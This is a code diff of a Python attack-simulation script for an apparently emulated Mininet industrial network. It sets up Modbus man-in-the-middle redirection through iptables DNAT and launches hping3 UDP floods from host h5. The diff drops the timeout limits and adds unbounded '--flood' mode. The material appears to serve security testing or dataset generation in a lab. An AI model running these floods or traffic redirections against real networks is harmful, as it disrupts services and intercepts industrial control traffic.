@@ -18,15 +18,12 @@ MITM_FIXED_SEED = 424242
 MODBUS_PORT = 5020
 MITM_PROXY_PORT = 50201
 
-
 def _new_run_id():
     return datetime.now().strftime("%Y%m%d_%H%M%S")
-
 
 def _resolve_host_log(attacker_name: str, host_log_dir: Optional[str] = None) -> str:
     base = host_log_dir or os.path.join(BASE_DIR, "logs", "host")
     return os.path.join(base, f"{attacker_name}.log")
-
 
 def _iptables_dnat_modbus(attacker, attacker_name: str, gateway_ip: str, enable: bool):
     eth1 = f"{attacker_name}-eth1"
@@ -46,7 +43,6 @@ def _iptables_dnat_modbus(attacker, attacker_name: str, gateway_ip: str, enable:
             f"--dport {MODBUS_PORT} -j DNAT --to-destination {dest} 2>/dev/null || true"
         )
 
-
 def _run_mitm_proxy_entrypoint():
     """Modbus proxy statis: Code/script/mitm/modbus_proxy.py (bukan hasil template)."""
     import importlib.util
@@ -57,7 +53,6 @@ def _run_mitm_proxy_entrypoint():
     assert spec.loader is not None
     spec.loader.exec_module(mod)
     mod.main()
-
 
 def run_mitm_attack(
     net,
@@ -112,7 +107,6 @@ def run_mitm_attack(
         f"DNAT Modbus -> :{MITM_PROXY_PORT}; fixed_seed={MITM_FIXED_SEED}; log {host_log_q}"
     )
 
-
 def run_dos_attack(net, mode="light", host_log_dir=None):
     h5 = net.get('h5')
     target_ip = "10.0.2.2"
@@ -134,20 +128,20 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
         # UDP
         h5.cmd(f"echo '[DOS][LIGHT][UDP] start pps~500 duration=45s' >> {host_log_q}")
         h5.cmd(
-            f"bash -lc 'timeout 45s hping3 --udp -q -p {target_port} -d 120 -i u200 {target_ip} >> {host_log_q} 2>&1 &'"
+            f"bash -lc 'hping3 --udp -q -p {target_port} -d 128 -i u200 {target_ip} >> {host_log_q} 2>&1 &'"
         )
 
         # SYN
-        h5.cmd(f"echo '[DOS][LIGHT][SYN] start pps~500 duration=45s' >> {host_log_q}")
-        h5.cmd(
-            f"bash -lc 'timeout 45s hping3 -S -q -p {target_port} -d 64 -i u300 {target_ip} >> {host_log_q} 2>&1 &'"
-        )
+        #h5.cmd(f"echo '[DOS][LIGHT][SYN] start pps~500 duration=45s' >> {host_log_q}")
+        #h5.cmd(
+            #f"bash -lc 'timeout 45s hping3 -S -q -p {target_port} -d 64 -i u300 {target_ip} >> {host_log_q} 2>&1 &'"
+        #)
 
         # ICMP
-        h5.cmd(f"echo '[DOS][LIGHT][ICMP] start pps~1000 duration=45s' >> {host_log_q}")
-        h5.cmd(
-            f"bash -lc 'timeout 45s hping3 --icmp -q -i u300 {target_ip} >> {host_log_q} 2>&1 &'"
-        )
+        #h5.cmd(f"echo '[DOS][LIGHT][ICMP] start pps~1000 duration=45s' >> {host_log_q}")
+        #h5.cmd(
+            #f"bash -lc 'timeout 45s hping3 --icmp -q -i u300 {target_ip} >> {host_log_q} 2>&1 &'"
+        #)
 
     elif mode == "heavy":
         print("Running HEAVY DoS (controlled high-rate attack)")
@@ -156,20 +150,20 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
         # UDP heavy (tanpa flood, tapi cepat)
         h5.cmd(f"echo '[DOS][HEAVY][UDP] start pps~3000 duration=60s' >> {host_log_q}")
         h5.cmd(
-            f"bash -lc 'timeout 60s hping3 --udp -q -p {target_port} -d 120 -i u20 {target_ip} >> {host_log_q} 2>&1 &'"
+            f"bash -lc 'hping3 --udp --flood -p {target_port} -d 128 {target_ip} >> {host_log_q} 2>&1 &'"
         )
 
         # SYN heavy
-        h5.cmd(f"echo '[DOS][HEAVY][SYN] start pps~3000 duration=60s' >> {host_log_q}")
-        h5.cmd(
-            f"bash -lc 'timeout 60s hping3 -S -q -p {target_port} -d 64 -i u30 {target_ip} >> {host_log_q} 2>&1 &'"
-        )
+        #h5.cmd(f"echo '[DOS][HEAVY][SYN] start pps~3000 duration=60s' >> {host_log_q}")
+        #h5.cmd(
+            #f"bash -lc 'timeout 60s hping3 -S -q -p {target_port} -d 64 -i u30 {target_ip} >> {host_log_q} 2>&1 &'"
+        #)
 
         # ICMP heavy
-        h5.cmd(f"echo '[DOS][HEAVY][ICMP] start pps~5000 duration=60s' >> {host_log_q}")
-        h5.cmd(
-            f"bash -lc 'timeout 60s hping3 --icmp -q -i u30 {target_ip} >> {host_log_q} 2>&1 &'"
-        )
+        #h5.cmd(f"echo '[DOS][HEAVY][ICMP] start pps~5000 duration=60s' >> {host_log_q}")
+        #h5.cmd(
+            #f"bash -lc 'timeout 60s hping3 --icmp -q -i u30 {target_ip} >> {host_log_q} 2>&1 &'"
+        #)
 
 
 if __name__ == "__main__":
